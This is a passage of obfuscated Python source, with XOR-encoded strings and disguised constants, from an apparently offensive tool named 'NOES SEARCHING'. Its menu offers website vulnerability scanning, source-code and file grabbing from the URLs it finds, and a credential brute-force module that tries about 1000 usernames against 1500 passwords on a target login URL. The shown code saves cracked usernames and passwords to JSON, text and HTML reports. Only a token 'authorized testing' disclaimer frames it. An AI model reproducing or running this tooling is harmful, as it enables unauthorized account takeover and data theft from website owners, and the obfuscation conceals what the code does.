            _OlOOO0IIOl00O0(f"  {_O1I01OOO011011}. {_0OI0IllO0I1OO0['username']}:{_0OI0IllO0I1OO0['password']} - {_0OI0IllO0I1OO0.get('login_url', 'N/A')}", _l1OIOIOIIOIIl01I(b'\x9e\xfeI\xdb\xbf\xe0\xdeI\x95\x83\xa7lg', b'>\\w"'))
        with open(_110l01I00lOIO00, _l1OIOIOIIOIIl01I(b'B', b'\x92#3\xa7')) as _0OI0IllO0I1OO0:
            json.dump(found, _0OI0IllO0I1OO0, indent=1385613926 ^ 1385613924)
        with open(_110Ol11IIO, _OIlO10OIO1O1(b'\x88', b'\xc8\xa2++')) as _0OI0IllO0I1OO0:
            _0OI0IllO0I1OO0.write(f'BRUTE FORCE RESULTS - {base_url}\n')
            _0OI0IllO0I1OO0.write(f'Generated: {_II00Oll11I1IOO()}\n')
            _0OI0IllO0I1OO0.write(f'Time: {elapsed}s\n')
            _0OI0IllO0I1OO0.write(f'Combinations tested: {tested}\n')
            _0OI0IllO0I1OO0.write(f'Credentials found: {len(found)}\n')
            _0OI0IllO0I1OO0.write(_1Ol10I0O0O(b'\xaf', b'\xc5{\xa5\n') * (2106179384 ^ 2106179332) + _OIlO10OIO1O1(b'\xa0\xa6', b'\xa6\xf6\x8b\x04'))
            for e in found:
                _0OI0IllO0I1OO0.write(f"Username: {e['username']}\n")
                _0OI0IllO0I1OO0.write(f"Password: {e['password']}\n")
                _0OI0IllO0I1OO0.write(f"Login URL: {e.get('login_url', 'N/A')}\n")
                _0OI0IllO0I1OO0.write(_l1OIOIOIIOIIl01I(b'\xd9', b'|\xd7\x0cb') * (1830446058 ^ 1830446018) + _l1OIOIOIIOIIl01I(b'\xda', b'\xc9A\xf6\xf9'))
        _OlOOO0IIOl00O0(f'[Noes] Results saved: {_110Ol11IIO}', _1Ol10I0O0O(b'H\xa6&s\x1d"r', b'c%\x9e\xa5'))
        _OlOOO0IIOl00O0(f'[Noes] Results saved: {_110l01I00lOIO00}', _OIlO10OIO1O1(b'\x99\xfe(ds\xfa\xbc', b'\x06-\xa8\xfd'))
    else:
        _OlOOO0IIOl00O0(f'[Noes] BRUTE COMPLETE - No credentials found | Time: {elapsed}s', _OIlO10OIO1O1(b'\xc4f\x9b!H\x87\xcf', b'\xa7B$\xf7'))
        _OlOOO0IIOl00O0(f'[Noes] Tested: {tested} combinations', _l1OIOIOIIOIIl01I(b'r\xe3\x9e\xcd', b'\xf2{/t'))

def _1O1I1llO0l():
    _l0I0Ol0IIOOIlO0l1O()
    print(_l11III0l1IO1lOl)
    total_vulns = len(_100III00lOI)
    _l1lO1I0I10ll = len(_llIl0l00I001llOl)
    _1OOOO1OIO0 = len(_0llOlI10lIII1)
    _0011IIIlO111OlO110 = _OIlO10OIO1O1(b"\xe1B\xaa9\xd2\xbc\x17Rm'\xa3\xaeV", b'\x84{GM') if _0OI100OO0001OI0 else _1Ol10I0O0O(b'\x80\xf4\xdfTe\xa6NM\xbdR', b'\x9e\x98H\x15')
    print(f'\n{_lOO0O0101IOl00001.YELLOW}MAIN MENU\n{_lOO0O0101IOl00001.CYAN}\n[ 1 ] SCAN SINGLE WEBSITE\n      Scan one target for vulnerabilities (12 categories)\n[ 2 ] SCAN MULTIPLE URLS (list.txt)\n      Scan all URLs from list.txt\n[ 3 ] VIEW SCAN RESULTS\n      Display all found vulnerabilities\n[ 4 ] GET SOURCE CODE\n      Grab full source code from vulnerability URL\n[ 5 ] DOWNLOAD FILE\n      Download file from vulnerability URL\n[ 6 ] VIEW DOWNLOADED FILES\n      List all downloaded files\n[ 7 ] BRUTE FORCE LOGIN\n      Try 1000 usernames + 1500 passwords combinations\n[ 8 ] VIEW LOGS\n      Display activity logs\n[ 9 ] EXPORT HTML REPORT\n      Generate HTML report\n[ 10] PAYLOAD DATABASE\n      View all payloads (12 categories)\n[ 11] CLEAR LOGS & RESET\n      Clear all logs and results\n[ A ] ABOUT / INFO\n      About this tool\n[ 0 ] EXIT\n      Exit {_0l00OI0llII}\n\n{_lOO0O0101IOl00001.GREEN}STATUS          : {_0011IIIlO111OlO110}\nVULNS FOUND     : {total_vulns}\nFILES DOWNLOADED: {_l1lO1I0I10ll}\nBRUTE FOUND     : {_1OOOO1OIO0}\nTIME            : {_lOO000IOl101II0()}\n{_lOO0O0101IOl00001.YELLOW}\n    ')

def _O0lIIOI1O0I1O1ll0():
    _l0I0Ol0IIOOIlO0l1O()
    print(f'\n{_lOO0O0101IOl00001.CYAN}ABOUT {_0l00OI0llII} v{_lI000O10IOO1l}\n\n{_lOO0O0101IOl00001.GREEN}Name         : {_0l00OI0llII}\nDeveloper    : {_lI0lOO0l010l1}\nGitHub       : {_OOI1Il10O11O}\nSystem       : Noes Search\nPlatform     : {_lII1OOlI0OI.system()} {_lII1OOlI0OI.machine()}\nMode         : {_lOO0O0101IOl00001.RED}\n\n{_lOO0O0101IOl00001.YELLOW}DESCRIPTION:\n{_lOO0O0101IOl00001.WHITE}NOES SEARCHING is a professional vulnerability scanner\nand source code grabber. Detects JSON leaks, sensitive files,\nadmin panels, API exposures, directory traversals, and more.\nIncludes brute force login testing module with 1000+ usernames\nand 1500+ passwords.\n\n{_lOO0O0101IOl00001.YELLOW}FEATURES:\n{_lOO0O0101IOl00001.WHITE}• 12 Category Payload Scanner (UPGRADE)\n• Source Code Grabber (saves to hasilnya/datahasil/)\n• Multi-Threading ({_l111lO0OlIl} threads)\n• Brute Force Login Module (1000 usernames, 1500 passwords)\n• Real-time Logs with progress\n• HTML Report Export\n• Download Manager\n• Severity Classification\n• {_lOO0O0101IOl00001.RED}Mode Search By Noes\n\n{_lOO0O0101IOl00001.RED}WARNING:\n{_lOO0O0101IOl00001.WHITE}• Use only for educational & authorized testing\n• Developer is not responsible for misuse\n• All actions are logged in real-time\n\n{_lOO0O0101IOl00001.CYAN}\n    ')
    input(f'{_lOO0O0101IOl00001.CYAN}Press Enter to return...{_lOO0O0101IOl00001.RESET}')

def _OIIOOlII100():
    _l0I0Ol0IIOOIlO0l1O()
    data = _Il1l0lIIl00l()
    if not data or not data.get(_l1OIOIOIIOIIl01I(b'\xa8\xc3\xb7r\xcb\x15P', b'xN\x8c\x88')):
        print(f'{_lOO0O0101IOl00001.RED}No scan results found.{_lOO0O0101IOl00001.RESET}')
        input(_l1OIOIOIIOIIl01I(b'#\x82\x9f\xcc\xfd)Ob\xab<\n\xe6\xfc(', b'N\x1b\xcb]'))
        return
    results = data.get(_1Ol10I0O0O(b'f\xf5p?d\\\xeb', b'k\xa3+\xec'), [])
    if not results:
        print(f'{_lOO0O0101IOl00001.YELLOW}No vulnerabilities found.{_lOO0O0101IOl00001.RESET}')
        input(_OIlO10OIO1O1(b't\xc7\x1cP\xd7\x9aB,\x81Ux\x8b\x02\x96', b'\xcb\xe5`\x0b'))
        return
    print(f'{_lOO0O0101IOl00001.GREEN}SCAN RESULTS - {_0l00OI0llII}{_lOO0O0101IOl00001.RESET}')
    print(f'{_lOO0O0101IOl00001.CYAN}Total: {len(results)} vulnerabilities{_lOO0O0101IOl00001.RESET}')
    print()
    critical = [v for v in results if v.get(_l1OIOIOIIOIIl01I(b'(\xd1\xc9+<\x8db\xe6', b'\xab\x18\x8b\xdf')) == _l1OIOIOIIOIIl01I(b'\x05\xa2\xe9\xd0n\xa3Gg', b'\xcdu`\xf6')]
    high = [v for v in results if v.get(_l1OIOIOIIOIIl01I(b'\x90\x83K0{\xc3\x08\xc5', b'o\x08\x0f\x8e')) == _l1OIOIOIIOIIl01I(b'ZW\xcd\xd0', b'\xb9\xf5\xe2;')]
    medium = [v for v in results if v.get(_1Ol10I0O0O(b',\x1ck\x0e\x1e\xb2\x8f\xfc', b'\xb2\xf5:\x0e')) == _l1OIOIOIIOIIl01I(b'\xea\xd7\xa6\xcdgo', b'\x0ba\x81\xa8')]
    low = [v for v in results if v.get(_1Ol10I0O0O(b')\xa4h\x9e\xd3\xd3\x9b\x01', b'\xcaP\xa4\x8c')) == _l1OIOIOIIOIIl01I(b'\x90Gj', b'G(\xd4\xb4')]
    if critical:
        print(f'{_lOO0O0101IOl00001.RED}CRITICAL ({len(critical)}){_lOO0O0101IOl00001.RESET}')
        for v in critical[:1487599834 ^ 1487599829]:
            print(f"  {_lOO0O0101IOl00001.RED}• {v.get('url', 'N/A')}{_lOO0O0101IOl00001.RESET}")
        print()
    if high:
        print(f'{_lOO0O0101IOl00001.YELLOW}HIGH ({len(high)}){_lOO0O0101IOl00001.RESET}')
        for v in high[:10044250 ^ 10044245]:
            print(f"  {_lOO0O0101IOl00001.YELLOW}• {v.get('url', 'N/A')}{_lOO0O0101IOl00001.RESET}")
        print()
    if medium:
        print(f'{_lOO0O0101IOl00001.CYAN}MEDIUM ({len(medium)}){_lOO0O0101IOl00001.RESET}')
        for v in medium[:149820149 ^ 149820154]:
            print(f"  {_lOO0O0101IOl00001.CYAN}• {v.get('url', 'N/A')}{_lOO0O0101IOl00001.RESET}")
        print()
    if low:
        print(f'{_lOO0O0101IOl00001.WHITE}LOW ({len(low)}){_lOO0O0101IOl00001.RESET}')
        for v in low[:1811874525 ^ 1811874514]:
            print(f"  {_lOO0O0101IOl00001.WHITE}• {v.get('url', 'N/A')}{_lOO0O0101IOl00001.RESET}")
        print()
    input(f'{_lOO0O0101IOl00001.CYAN}Press Enter to return...{_lOO0O0101IOl00001.RESET}')

def _OlO0OO0IO1I1l110():
    _l0I0Ol0IIOOIlO0l1O()
    data = _Il1l0lIIl00l()
    if not data or not data.get(_1Ol10I0O0O(b'p\x89\x06\x97\xc86C', b'\x1b\x1a9g')):
        print(f'{_lOO0O0101IOl00001.RED}No results found. Run a scan first.{_lOO0O0101IOl00001.RESET}')
        input(_l1OIOIOIIOIIl01I(b'=\tZ\xb1fK\xf5S\xdc\xb9\x13:x\xe3', b'>\x93\xad\x03'))
        return
    results = data.get(_1Ol10I0O0O(b'F\x1b\xea\xd5\x92R\xcb', b'\xb0t\\3'), [])
    print(f'{_lOO0O0101IOl00001.GREEN}GET SOURCE CODE{_lOO0O0101IOl00001.RESET}')
    print(f'{_lOO0O0101IOl00001.CYAN}Select URL to grab source:{_lOO0O0101IOl00001.RESET}\n')
    _lll11Ol00Ol0l0OOl1 = []
    for _l0IllOOlOlOIO0IOO1, v in enumerate(results, 126451893 ^ 126451892):
        url = v.get(_l1OIOIOIIOIIl01I(b'\xf1\xebD', b'\x8e:\x01\xd8'), _OIlO10OIO1O1(b'', b'sS\xccR'))
        vuln_type = v.get(_l1OIOIOIIOIIl01I(b'\xfb\x06\x1e\xae\xb1\xda\xc1\xe2\xd5', b'\xabM0\xf6'), _l1OIOIOIIOIIl01I(b'\xc4\xe9\x19S\x1c\r\xe3', b'\xdf"6\x8e'))
        _lll11Ol00Ol0l0OOl1.append(v)
        print(f'{_lOO0O0101IOl00001.GREEN}[{_l0IllOOlOlOIO0IOO1}] {_lOO0O0101IOl00001.WHITE}{url}')
        print(f'    {_lOO0O0101IOl00001.CYAN}Type: {vuln_type}{_lOO0O0101IOl00001.RESET}')
    print()
    choice = input(f"{_lOO0O0101IOl00001.CYAN}Select number (or 'all', 0=back): {_lOO0O0101IOl00001.WHITE}")
    if choice == _l1OIOIOIIOIIl01I(b'\x04', b'\xe0q\xe5\xe9'):
        return
    elif choice.lower() == _OIlO10OIO1O1(b'U\x16\xef', b'D\xa9`H'):
        _0l1OO11IIIlIIOlO = 1456164286 ^ 1456164286
        for v in _lll11Ol00Ol0l0OOl1:
            if _101lIIOl11I00O0l(v.get(_l1OIOIOIIOIIl01I(b'\x01\xd7\x8f', b'YK?\x9e'), _1Ol10I0O0O(b'', b'\x8a\xc7\xa4w'))):
                _0l1OO11IIIlIIOlO += 863365564 ^ 863365565
        print(f'{_lOO0O0101IOl00001.GREEN}Grabbed {_0l1OO11IIIlIIOlO} source codes to {_10lIlOOl0llO}{_lOO0O0101IOl00001.RESET}')
    elif choice.isdigit():
        _l0IllOOlOlOIO0IOO1 = int(choice) - (2146410431 ^ 2146410430)
        if 898425448 ^ 898425448 <= _l0IllOOlOlOIO0IOO1 < len(_lll11Ol00Ol0l0OOl1):
            if _101lIIOl11I00O0l(_lll11Ol00Ol0l0OOl1[_l0IllOOlOlOIO0IOO1].get(_1Ol10I0O0O(b'\xfb\x15"', b'<\x93\x84\xef'), _l1OIOIOIIOIIl01I(b'', b'\x90\xb5\xd4\xce'))):
                print(f'{_lOO0O0101IOl00001.GREEN}Source saved to {_10lIlOOl0llO}{_lOO0O0101IOl00001.RESET}')
        else:
            print(f'{_lOO0O0101IOl00001.RED}Invalid number!{_lOO0O0101IOl00001.RESET}')
    else:
        print(f'{_lOO0O0101IOl00001.RED}Unknown choice!{_lOO0O0101IOl00001.RESET}')
    input(f'\n{_lOO0O0101IOl00001.CYAN}Press Enter to return...{_lOO0O0101IOl00001.RESET}')

def _l1lIO1OIl1lI0O():
    _l0I0Ol0IIOOIlO0l1O()
    data = _Il1l0lIIl00l()
    if not data or not data.get(_1Ol10I0O0O(b'.\xc6f\x19\xe9@Z', b'{8\x84N')):
        print(f'{_lOO0O0101IOl00001.RED}No results found.{_lOO0O0101IOl00001.RESET}')
        input(_l1OIOIOIIOIIl01I(b'\x9e\xd4\x00X\xaa\xc1\xea\xd3\xb7\xbb\xe9p\xe9\xc9', b'h(\xb0\xf1'))
        return
    results = data.get(_OIlO10OIO1O1(b'\xd0kR{Mnd', b'\xfa\xcc\x97z'), [])
    print(f'{_lOO0O0101IOl00001.GREEN}DOWNLOAD FILE{_lOO0O0101IOl00001.RESET}')
    print(f'{_lOO0O0101IOl00001.CYAN}Select file to download:{_lOO0O0101IOl00001.RESET}\n')
    for _O0lllO1l1O1, v in enumerate(results, 74508507 ^ 74508506):
        url = v.get(_OIlO10OIO1O1(b'\x01$`', b'r=\xd0\x05'), _1Ol10I0O0O(b'', b'\xec8\xaa\x8f'))
        vuln_type = v.get(_1Ol10I0O0O(b'\xda\x80\xa0\xfd\xa8\xb3\x89\x8e\xcc', b'\xb3\x06\x8f\xb9'), _l1OIOIOIIOIIl01I(b'\xe4\xc2#K\xec<u', b'x\xf0k\xfe'))
        print(f'{_lOO0O0101IOl00001.GREEN}[{_O0lllO1l1O1}] {_lOO0O0101IOl00001.WHITE}{url}')
        print(f'    {_lOO0O0101IOl00001.CYAN}Type: {vuln_type}{_lOO0O0101IOl00001.RESET}')
    print()
    choice = input(f"{_lOO0O0101IOl00001.CYAN}Select number (or 'all', 0=back): {_lOO0O0101IOl00001.WHITE}")
    if choice == _1Ol10I0O0O(b'\xad', b'\xfdgg\x97'):
        return
    elif choice.lower() == _l1OIOIOIIOIIl01I(b'\xdb\xb6\xbc', b'|\x99*\x99'):
        _lI110I00I00 = 2078866395 ^ 2078866395
        for v in results:
            url = v.get(_1Ol10I0O0O(b'\xe5\xfd\xbd', b'\xe3\xebc\x94'), _1Ol10I0O0O(b'', b'zOL\xbb'))
            filename = url.split(_l1OIOIOIIOIIl01I(b'0', b'\x02s\xfa '))[-(617443441 ^ 617443440)] or f'file_{_0l10I0OOI0.md5(url.encode()).hexdigest()[:8]}.html'
            if _O0III0IIl0(url, filename):
                _lI110I00I00 += 1562712440 ^ 1562712441
        print(f'{_lOO0O0101IOl00001.GREEN}Downloaded {_lI110I00I00} files to {_10lIlOOl0llO}{_lOO0O0101IOl00001.RESET}')
    elif choice.isdigit():
        _O0lllO1l1O1 = int(choice) - (653789546 ^ 653789547)
        if 597784105 ^ 597784105 <= _O0lllO1l1O1 < len(results):
            v = results[_O0lllO1l1O1]
            url = v.get(_l1OIOIOIIOIIl01I(b'\x97\xdb$', b'\x19\x89\x96;'), _OIlO10OIO1O1(b'', b'?%\xbf\x19'))
            filename = url.split(_l1OIOIOIIOIIl01I(b'\x0e', b'h\x87J>'))[-(1120709309 ^ 1120709308)] or f'file_{_0l10I0OOI0.md5(url.encode()).hexdigest()[:8]}.html'
            if _O0III0IIl0(url, filename):
                print(f'{_lOO0O0101IOl00001.GREEN}File saved to {_10lIlOOl0llO}{_lOO0O0101IOl00001.RESET}')
        else:
            print(f'{_lOO0O0101IOl00001.RED}Invalid number!{_lOO0O0101IOl00001.RESET}')
    else:
        print(f'{_lOO0O0101IOl00001.RED}Unknown choice!{_lOO0O0101IOl00001.RESET}')
    input(f'\n{_lOO0O0101IOl00001.CYAN}Press Enter to return...{_lOO0O0101IOl00001.RESET}')

def _1l1I010110():
    _l0I0Ol0IIOOIlO0l1O()
    if not _llIl0l00I001llOl:
        print(f'{_lOO0O0101IOl00001.YELLOW}No files downloaded yet.{_lOO0O0101IOl00001.RESET}')
        input(_1Ol10I0O0O(b'f\x9a\xb7\x19`\xa6\x8f\xba_\x9c\xae\xd2\xeeI', b'?\xed\xe7\xad'))
        return
    print(f'{_lOO0O0101IOl00001.GREEN}DOWNLOADED FILES{_lOO0O0101IOl00001.RESET}')
    print(f'{_lOO0O0101IOl00001.CYAN}Total: {len(_llIl0l00I001llOl)} files{_lOO0O0101IOl00001.RESET}\n')
    _1lOlI1O1I1Ol1OOl = 1090410483 ^ 1090410483
    for _11IllI0001OIO0I, _OOOl1Ol1lO0IO in enumerate(_llIl0l00I001llOl, 1132152142 ^ 1132152143):
        size = _OOOl1Ol1lO0IO.get(_OIlO10OIO1O1(b'6\xbf\xa8=', b'\x06\x88\x1e\xd2'), 437307098 ^ 437307098)
        _1lOlI1O1I1Ol1OOl += size
        _l01lll1O1III11 = size // (2046716125 ^ 2046717149)
        print(f"{_lOO0O0101IOl00001.GREEN}[{_11IllI0001OIO0I}] {_lOO0O0101IOl00001.WHITE}{_OOOl1Ol1lO0IO.get('filename', 'N/A')}")
        print(f"    {_lOO0O0101IOl00001.CYAN}Size: {_l01lll1O1III11} KB | Path: {_OOOl1Ol1lO0IO.get('path', 'N/A')}{_lOO0O0101IOl00001.RESET}")
    _llll0I10OOlOI1 = _1lOlI1O1I1Ol1OOl // (813548921 ^ 813547897)
    print(f'\n{_lOO0O0101IOl00001.CYAN}Total Size: {_llll0I10OOlOI1} KB{_lOO0O0101IOl00001.RESET}')
    input(f'\n{_lOO0O0101IOl00001.CYAN}Press Enter to return...{_lOO0O0101IOl00001.RESET}')

def _IOI11lllOlI0l1l():
    _l0I0Ol0IIOOIlO0l1O()
    print(f'{_lOO0O0101IOl00001.GREEN}BRUTE FORCE LOGIN - ULTIMATE MODE{_lOO0O0101IOl00001.RESET}')
    print(f'{_lOO0O0101IOl00001.CYAN}Usernames: {len(_l1OOlOI01I01)} | Passwords: {len(_II10IOl1I1O)}{_lOO0O0101IOl00001.RESET}')
    print(f'{_lOO0O0101IOl00001.CYAN}Total Combinations: {len(_l1OOlOI01I01) * len(_II10IOl1I1O)}{_lOO0O0101IOl00001.RESET}')
    print(f'{_lOO0O0101IOl00001.YELLOW}Logs akan menampilkan progress setiap 100 percobaan{_lOO0O0101IOl00001.RESET}')
    print(f'{_lOO0O0101IOl00001.YELLOW}Hasil yang ditemukan akan langsung ditampilkan di logs{_lOO0O0101IOl00001.RESET}')
    print()
    url = input(f'{_lOO0O0101IOl00001.CYAN}Enter target URL: {_lOO0O0101IOl00001.WHITE}')
    if not url:
        return
    print(f'{_lOO0O0101IOl00001.RED}Memulai BRUTE FORCE... Lihat logs untuk progress!{_lOO0O0101IOl00001.RESET}')
    print(f'{_lOO0O0101IOl00001.YELLOW}Ini akan memakan waktu, bersabarlah...{_lOO0O0101IOl00001.RESET}')
    print()
    _l0I10IIl1lI(url)
    input(f'\n{_lOO0O0101IOl00001.CYAN}Press Enter to return...{_lOO0O0101IOl00001.RESET}')

def _0l0OII11IOOI01II():
    _l0I0Ol0IIOOIlO0l1O()
    if not _0Il1llO1lIO0l.path.exists(_lOO110110Il):
        print(f'{_lOO0O0101IOl00001.YELLOW}No logs found.{_lOO0O0101IOl00001.RESET}')
        input(_OIlO10OIO1O1(b'j\xf4n\xef\xe9\xae0\x07\xfb\x9d\xde\x1c`\xfd', b'\xf0\x0e\xeb\xa0'))
        return
    print(f'{_lOO0O0101IOl00001.GREEN}REAL-TIME LOGS{_lOO0O0101IOl00001.RESET}\n')
    try:
        with open(_lOO110110Il, _OIlO10OIO1O1(b'\xca', b'\xf5\xd3+M'), encoding=_OIlO10OIO1O1(b'\x1efmW\xa4', b'\x9e\x12\x04\xc6'), errors=_1Ol10I0O0O(b'\xf82\xe9\xa0d\xef', b'\xf8\x83\x83\xa4')) as _OOIOO01011llO1111:
            lines = _OOIOO01011llO1111.readlines()
            _1OO0Ol0l01IOO01 = max(2071447558 ^ 2071447558, len(lines) - (1576092395 ^ 1576092307))
            for _1l1IllO0II0011I in lines[_1OO0Ol0l01IOO01:]:
                _1l1IllO0II0011I = _1l1IllO0II0011I.strip()
                if not _1l1IllO0II0011I:
                    continue
                if _1Ol10I0O0O(b'}\xa7\xd3\xb3', b'\xa2d7\x80') in _1l1IllO0II0011I or _l1OIOIOIIOIIl01I(b'\x08\xee\xcaj\xee\xcbr\xa4', b'\x91_j\x93') in _1l1IllO0II0011I:
                    print(f'{_lOO0O0101IOl00001.RED}{_1l1IllO0II0011I}{_lOO0O0101IOl00001.RESET}')
                elif _OIlO10OIO1O1(b'%\xb0R]ze', b'\x9e\xb1[O') in _1l1IllO0II0011I or _l1OIOIOIIOIIl01I(b'\x80\x89EH\x16\x81&a', b'\xc4\xb5\x1c\xb8') in _1l1IllO0II0011I:
                    print(f'{_lOO0O0101IOl00001.BLUE}{_1l1IllO0II0011I}{_lOO0O0101IOl00001.RESET}')
                elif _OIlO10OIO1O1(b'|Z\x7fj\xf8\xbeY', b'\xef!\x9fH') in _1l1IllO0II0011I or _1Ol10I0O0O(b'\xfa\xc6\x07`\n', b'\x8b\xb0\x9fo') in _1l1IllO0II0011I:
                    print(f'{_lOO0O0101IOl00001.GREEN}{_1l1IllO0II0011I}{_lOO0O0101IOl00001.RESET}')
                elif _l1OIOIOIIOIIl01I(b'e}M\xeb\xb5\xe3\xb6', b'\xdeS\xdd\xc4') in _1l1IllO0II0011I:
                    print(f'{_lOO0O0101IOl00001.YELLOW}{_1l1IllO0II0011I}{_lOO0O0101IOl00001.RESET}')
                elif _1Ol10I0O0O(b'~\xcf\xd0\xe8J', b'\xcf\xce\xee\xaf') in _1l1IllO0II0011I:
                    print(f'{_lOO0O0101IOl00001.RED}{_1l1IllO0II0011I}{_lOO0O0101IOl00001.RESET}')
                elif _l1OIOIOIIOIIl01I(b'\x93m\xff!\xb3', b'\xb9Y\xc6\x0c') in _1l1IllO0II0011I:
                    print(f'{_lOO0O0101IOl00001.MAGENTA}{_1l1IllO0II0011I}{_lOO0O0101IOl00001.RESET}')
                elif _1Ol10I0O0O(b';|\x05\x80\xb2\xd0\x1fa\x7f\xa5Bs5', b"\x1c\x07'\x07") in _1l1IllO0II0011I:
                    print(f'{_lOO0O0101IOl00001.GREEN}{_11lIl00I1IO1I.BRIGHT}{_1l1IllO0II0011I}{_lOO0O0101IOl00001.RESET}')
                else:
                    print(_1l1IllO0II0011I)
    except Exception as e:
        print(f'{_lOO0O0101IOl00001.RED}Error: {e}{_lOO0O0101IOl00001.RESET}')
    print(f'\n{_lOO0O0101IOl00001.CYAN}Showing last 120 lines{_lOO0O0101IOl00001.RESET}')
    input(f'\n{_lOO0O0101IOl00001.CYAN}Press Enter to return...{_lOO0O0101IOl00001.RESET}')

def _1I0ll01IIOIlO0I1lO():
    data = _Il1l0lIIl00l()
    if not data or not data.get(_1Ol10I0O0O(b'\x11\xb3i\x06\xe6f\xf6', b'1\x14j\x84')):
        print(f'{_lOO0O0101IOl00001.RED}No results to export!{_lOO0O0101IOl00001.RESET}')
        input(_l1OIOIOIIOIIl01I(b'\xd3p\x9a\xf0\x82\xf4\xc3\x16\xb4\xe9dh9\xbe', b'\xc3\x1fXB'))
        return
    results = data.get(_l1OIOIOIIOIIl01I(b'VW3[4$X', b'^Y"\x03'), [])
    brute_found = data.get(_OIlO10OIO1O1(b'\xa1_\x9a\x0b\x04X)\xe1\xc3&\xf0', b']8\xe4\xed'), [])
    html = f"""<!DOCTYPE html>\n<html>\n<head>\n    <meta charset="UTF-8">\n    <meta name="viewport" content="width=device-width, initial-scale=1.0">\n    <title>{_0l00OI0llII} - Report</title>\n    <style>\n        * {{ margin: 0; padding: 0; box-sizing: border-box; }}\n        body {{ background: #0a0a0a; color: #00ff00; font-family: 'Courier New', monospace; padding: 20px; }}\n        .container {{ max-width: 1200px; margin: 0 auto; }}\n        h1 {{ color: #ff4444; border-bottom: 2px solid #ff4444; padding-bottom: 10px; }}\n        h2 {{ color: #ff8844; margin: 20px 0 10px 0; }}\n        .header {{ background: #1a1a1a; padding: 20px; border-radius: 10px; margin-bottom: 20px; }}\n        .stats {{ display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 10px; margin: 15px 0; }}\n        .stat {{ background: #0a0a0a; padding: 10px 15px; border-radius: 5px; border: 1px solid #333; }}\n        .stat .label {{ color: #888; font-size: 12px; }}\n        .stat .value {{ color: #00ff00; font-size: 20px; font-weight: bold; }}\n        .vuln {{ background: #1a1a1a; padding: 12px; margin: 8px 0; border-left: 4px solid #ff4444; border-radius: 5px; }}\n        .vuln.critical {{ border-color: #ff0000; background: #2a0000; }}\n        .vuln.high {{ border-color: #ff8800; background: #2a1a00; }}\n        .vuln.medium {{ border-color: #ffcc00; background: #1a1a00; }}\n        .vuln.low {{ border-color: #00ccff; background: #001a2a; }}\n        .vuln .url {{ color: #00ccff; word-break: break-all; }}\n        .vuln .type {{ color: #ffff00; font-size: 13px; }}\n        .vuln .meta {{ color: #888; font-size: 12px; }}\n        .brute {{ background: #2a0044; border-left: 4px solid #ff44ff; padding: 12px; margin: 8px 0; border-radius: 5px; }}\n        .brute .creds {{ color: #ff44ff; font-weight: bold; }}\n        .brute .url {{ color: #00ccff; }}\n        .footer {{ margin-top: 30px; padding-top: 20px; border-top: 1px solid #333; text-align: center; color: #666; font-size: 12px; }}\n        .badge {{ display: inline-block; background: #ff4444; color: #fff; padding: 2px 8px; border-radius: 3px; font-size: 10px; }}\n        .badge.critical {{ background: #ff0000; }}\n        .badge.high {{ background: #ff8800; }}\n        .badge.medium {{ background: #ffcc00; color: #000; }}\n        .badge.low {{ background: #00ccff; color: #000; }}\n        .badge.success {{ background: #00ff00; color: #000; }}\n    </style>\n</head>\n<body>\n<div class="container">\n    <div class="header">\n        <h1>{_0l00OI0llII} v{_lI000O10IOO1l} - Report</h1>\n        <div class="stats">\n            <div class="stat"><div class="label">Total Vulns</div><div class="value">{len(results)}</div></div>\n            <div class="stat"><div class="label">Downloaded</div><div class="value">{len(_llIl0l00I001llOl)}</div></div>\n            <div class="stat"><div class="label">Brute Found</div><div class="value">{len(brute_found)}</div></div>\n            <div class="stat"><div class="label">Generated</div><div class="value" style="font-size:14px;">{_II00Oll11I1IOO()}</div></div>\n        </div>\n    </div>\n    \n    <h2>Vulnerabilities</h2>"""
    for v in results:
        severity = v.get(_OIlO10OIO1O1(b'\xc6\xeb\xed\x05TT\x1d\x06', b'\xb8l3Z'), _1Ol10I0O0O(b'6\xe4N', b'P\x07U\xff')).lower()
        html += f"""\n    <div class="vuln {severity}">\n        <div class="url">{v.get('url', 'N/A')}</div>\n        <div class="type">Type: {v.get('vuln_type', 'Unknown')} <span class="badge {severity}">{v.get('severity', 'LOW')}</span></div>\n        <div class="meta">Status: {v.get('status', 'N/A')} | Size: {v.get('size', 0)} bytes</div>\n    </div>"""
    if brute_found:
        html += f'\n    <h2>Brute Force Results</h2>'
        for _100Ol0O1IOl1l1II1 in brute_found:
            html += f"""\n    <div class="brute">\n        <div class="creds">✅ Username: {_100Ol0O1IOl1l1II1.get('username')} | Password: {_100Ol0O1IOl1l1II1.get('password')}</div>\n        <div class="url">Login URL: {_100Ol0O1IOl1l1II1.get('login_url', 'N/A')}</div>\n        <div class="meta">Found: {_100Ol0O1IOl1l1II1.get('timestamp', 'N/A')}</div>\n    </div>"""
    html += f'\n    <div class="footer">\n        {_0l00OI0llII} v{_lI000O10IOO1l} | Developer: {_lI0lOO0l010l1}<br>\n        GitHub: {_OOI1Il10O11O} | Mode: REAL - NO SIMULATION\n    </div>\n</div>\n</body>\n</html>'
    _I1l1IO0IO1O1I0O = _0Il1llO1lIO0l.path.join(_10lIlOOl0llO, _1Ol10I0O0O(b'Ei\xff\xaa\xf00\xc8@_Y3', b'\x9c\x07tG'))
    with open(_I1l1IO0IO1O1I0O, _1Ol10I0O0O(b'8', b'\x01\x86\x16j'), encoding=_OIlO10OIO1O1(b' M\x8fc\x93', b'\xf1\xfc\x93\x99')) as _O1OllIll00l1O001O0:
        _O1OllIll00l1O001O0.write(html)
    print(f'{_lOO0O0101IOl00001.GREEN}Report saved: {_I1l1IO0IO1O1I0O}{_lOO0O0101IOl00001.RESET}')
    input(f'\n{_lOO0O0101IOl00001.CYAN}Press Enter to return...{_lOO0O0101IOl00001.RESET}')

def _lOI10l1IlI1I10():
    _l0I0Ol0IIOOIlO0l1O()
    print(f'{_lOO0O0101IOl00001.GREEN}PAYLOAD DATABASE - 12 Categories{_lOO0O0101IOl00001.RESET}\n')
    total = 584373854 ^ 584373854
